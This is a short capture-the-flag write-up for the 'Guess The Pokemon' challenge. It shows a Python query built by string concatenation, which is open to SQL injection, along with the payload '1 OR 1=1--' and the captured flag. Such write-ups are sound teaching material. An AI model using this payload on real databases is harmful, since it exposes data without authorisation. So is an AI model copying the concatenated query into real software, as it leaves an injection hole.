## Guess The Pokemon

If you check the code, you will see that there is a sql injection vulnerability in it
```python
cur.execute("SELECT * FROM pokemon WHERE names=" + name + "")
```

payload
```sql
1 OR 1=1--
```

```
LITCTF{flagr3l4t3dt0pok3m0n0rsom3th1ng1dk}
```